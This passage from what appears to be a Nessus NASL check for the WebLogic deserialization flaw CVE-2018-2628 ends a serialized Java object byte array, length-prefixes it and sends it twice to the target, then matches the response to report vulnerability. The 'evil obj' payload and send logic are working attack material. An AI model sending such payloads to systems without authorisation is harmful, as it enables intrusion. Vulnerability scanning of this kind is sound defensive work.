    0x62, 0x6c, 0x6f, 0x67, 0x69, 0x63, 0x2e, 0x72, 0x6d, 0x69, 0x2e, 0x69, 0x6e, 0x74, 0x65, 0x72,
    0x6e, 0x61, 0x6c, 0x2e, 0x4d, 0x65, 0x74, 0x68, 0x6f, 0x64, 0x44, 0x65, 0x73, 0x63, 0x72, 0x69,
    0x70, 0x74, 0x6f, 0x72, 0x12, 0x48, 0x5a, 0x82, 0x8a, 0xf7, 0xf6, 0x7b, 0x0c, 0x00, 0x00, 0x78,
    0x70, 0x77, 0x34, 0x00, 0x2e, 0x61, 0x75, 0x74, 0x68, 0x65, 0x6e, 0x74, 0x69, 0x63, 0x61, 0x74,
    0x65, 0x28, 0x4c, 0x77, 0x65, 0x62, 0x6c, 0x6f, 0x67, 0x69, 0x63, 0x2e, 0x73, 0x65, 0x63, 0x75,
    0x72, 0x69, 0x74, 0x79, 0x2e, 0x61, 0x63, 0x6c, 0x2e, 0x55, 0x73, 0x65, 0x72, 0x49, 0x6e, 0x66,
    0x6f, 0x3b, 0x29, 0x00, 0x00, 0x00, 0x1b, 0x78, 0x78, 0xfe, 0x00, 0xff
);
len = strlen(data) + 4;
dlen = raw_string(len/(256*256*256));
len = len%(256*256*256);
dlen += raw_string(len/(256*256));
len = len%(256*256);
dlen += raw_string(len/256);
len = len%(256);
dlen += raw_string(len);
data = dlen + data;
send(socket:sock, data:data);
sleep(2);
send(socket:sock, data:data);
# display("Send evil obj successful\n");

data = recv(socket:sock, length:4096, timeout:15);
close(sock);

# if(!ereg(pattern:"\$Proxy[0-9]+", string:data, multiline:true, icase:false)){
if("$Proxy" >!< data || "cannot be cast to" >!< data) {
	audit(AUDIT_INST_VER_NOT_VULN, appname, version);
} else {
	security_report_v4(port:port, severity:SECURITY_HOLE, extra:"Found WebLogic RCE CVE-2018-2628");
}
